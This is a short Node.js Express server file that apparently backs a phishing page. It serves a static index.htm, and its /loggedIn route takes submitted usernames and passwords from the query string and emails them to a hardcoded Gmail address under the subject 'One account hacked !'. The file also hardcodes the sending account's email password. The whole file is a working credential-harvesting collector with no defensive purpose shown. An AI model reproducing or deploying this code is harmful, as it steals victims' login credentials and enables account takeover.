const express = require('express');
var nodemailer = require('nodemailer');

const app = express();

var transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'mailfromebinxavier@gmail.com',
    pass: 'chakkalakkal'
  }
});

app.use(express.static('./'))

app.get('/', (req,res)=>{
    res.sendFile(__dirname+'/index.htm')
})

app.get('/loggedIn', (req,res)=>{
    console.log('req', req.query);

    var mailOptions = {
        from: 'mailfromebinxavier@gmail.com',
        to: 'ebinx7@gmail.com',
        subject: 'One account hacked !',
        text: 'User Name: '+req.query.uname+'\nPassword: '+req.query.pass
      };
    
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
          console.log(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });

    
    res.send(req.query)

})

app.listen(process.env.PORT || 3030);
console.log('App is listening to localhost:3030 ...');